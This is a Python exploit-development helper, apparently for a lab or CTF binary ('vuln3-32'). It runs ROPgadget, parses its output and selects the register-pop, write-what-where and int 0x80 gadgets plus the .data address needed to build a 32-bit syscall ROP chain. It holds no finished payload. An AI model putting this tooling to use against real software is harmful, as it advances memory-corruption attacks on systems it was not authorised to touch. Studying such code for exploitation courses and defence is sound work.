import subprocess
import struct
import re
from struct import pack
import sys
import os
def find_gadgets(vulnerable_program):
    ROPgadget_call = ["ROPgadget", "--binary", f"{vulnerable_program}", "--ropchain", "--badbytes", "0a"]

    try:
        print(f"[*] Running ROPgadget on {vulnerable_program}...")
        result = subprocess.run(ROPgadget_call, capture_output=True, text=True, check=True)
        ropchain_output = result.stdout

        with open("ropchain.txt", "w") as f:
            f.write(ropchain_output)
    except subprocess.CalledProcessError as e:
        print(f"Error running ROPgadget: {e}")
        sys.exit(1)

def search_gadget(gadget_list, target_start, requires_ret=True):
    """
    Searches for the best gadget that starts with 'target_start'.
    Returns: (address_int, junk_padding_count)
    """
    candidates = []

    for addr, instruction in gadget_list:
        affected=[]
        # 1. Check if instruction starts with what we want (e.g. "pop ecx")
        if instruction.startswith(target_start):
            
            parts = [x.strip() for x in instruction.split(';')]
            
            # 2. Check for 'ret' if required
            if requires_ret and parts[-1] != 'ret':
                continue

            # 3. Calculate Junk (count extra 'pop's after the first instruction)
            # We assume the first part is our target. 
            # Every subsequent 'pop' before 'ret' is a value we must pad.
            junk_count = 0
            for part in parts[1:]:
                if part == 'ret': 
                    break
                if part.startswith('pop'):
                    register = part.split()[1]
                    affected.append(register)
                    junk_count += 1
            
            candidates.append((addr, junk_count, instruction,affected))

    if not candidates:
        raise ValueError(f"No gadget found starting with: '{target_start}'")

    # 4. Sort by junk_count ascending (prefer 0 junk)
    # If tie, pick the one with shorter string length (usually simpler)
    candidates.sort(key=lambda x: (x[1], len(x[2])))

    best_match = candidates[0]
    # print(f"[+] Selected '{target_start}': {best_match[2]} (Junk: {best_match[1]})")
    
    return best_match[0], best_match[1], best_match[3]

def extract_gadgets():
    try:
        with open("ropchain.txt", "r") as f:
            ropchain_data = f.read()
    except FileNotFoundError:
        print("[-] ropchain.txt not found. Run find_gadgets first.")
        sys.exit(1)
    # delete ropchain.txt after reading

    os.remove("ropchain.txt")
    # --- Parse all gadgets into a list first ---
    # List of tuples: [(0xAddr, "instruction string"), ...]
    parsed_gadgets = []
    
    # Regex: Matches "[+] Gadget found: 0x080484a0 pop edx ; ret"
    gadget_re = re.compile(r'\[\+\] Gadget found: (0x[0-9a-fA-F]+)\s+(.+)')

    for match in gadget_re.finditer(ropchain_data):
        addr_str, instruction = match.groups()
        address = int(addr_str, 16)
        parsed_gadgets.append((address, instruction.strip()))

    # --- Retrieve Gadgets (Dynamic Search) ---
    try:
        # Helper to pack immediately
        def get_g(target, ret=True):
            addr, junk,affected = search_gadget(parsed_gadgets, target, ret)
            return pack("<I", addr), junk,affected

        # 1. Write-what-where
        MOVISTACK, _ ,_= get_g('mov dword ptr [edx], eax') # Usually 0 junk

        # 2. Registers
        POPEDX,_ ,_ = get_g('pop edx')
        POPEAX, _,_ = get_g('pop eax')
        POPEBX, _,_ = get_g('pop ebx')
        
        # 3. Operations
        XOREAX, _ ,_ = get_g('xor eax, eax')
        INCEAX, _ ,_ = get_g('inc eax')

        # 4. ECX (Often dirty in static builds, e.g., 'pop ecx ; pop ebx ; ret')
        POPECX, _,_ = get_g('pop ecx')

        # 5. Syscall (Does not end in ret)
        INT80,_, _ = get_g('int 0x80', ret=False)

    except ValueError as e:
        print(f"CRITICAL ERROR: {e}")
        sys.exit(1)

    # --- Get .data Address ---
    # Looks for: p += pack('<I', 0x080cf020) # @ .data
    data_re = re.compile(r"pack\('<I', (0x[0-9a-fA-F]+)\).+@ \.data")
    m = data_re.search(ropchain_data)
    
    if not m:
        # Fallback regex for the list section if python code not found
        data_re_alt = re.compile(r"0x([0-9a-fA-F]+)\)\s*# @ \.data")
        m = data_re_alt.search(ropchain_data)
        
    if not m:
        print("Error: .data address not found in ropchain.txt")
        sys.exit(1)
    
    data_addr = int(m.group(1), 16)
    STACK = pack("<I", data_addr)
    
    # Standard 4-byte padding
    DUMMY = pack("<I", 0x42424242)

    # Return structure: 
    # (Instruction_Pack, Junk_Count_Needed_After_Arg)
    
    gadgets = {
        "MOVISTACK": (get_g('mov dword ptr [edx], eax')),
        "POPEDX": (get_g('pop edx')),
        "POPEAX": (get_g('pop eax')),
        "XOREAX": (get_g('xor eax, eax')),
        "INCEAX": (get_g('inc eax')),
        "POPEBX": (get_g('pop ebx')),
        "POPECX": (get_g('pop ecx')),
        "INT80": (get_g('int 0x80', ret=False)),
        "STACK": STACK,
        "DUMMY": DUMMY
    }
    
    return gadgets

# Example Usage Logic
if __name__ == "__main__":
    find_gadgets("./vuln3-32") # Uncomment to run generation
    
    g = extract_gadgets()
    print(g)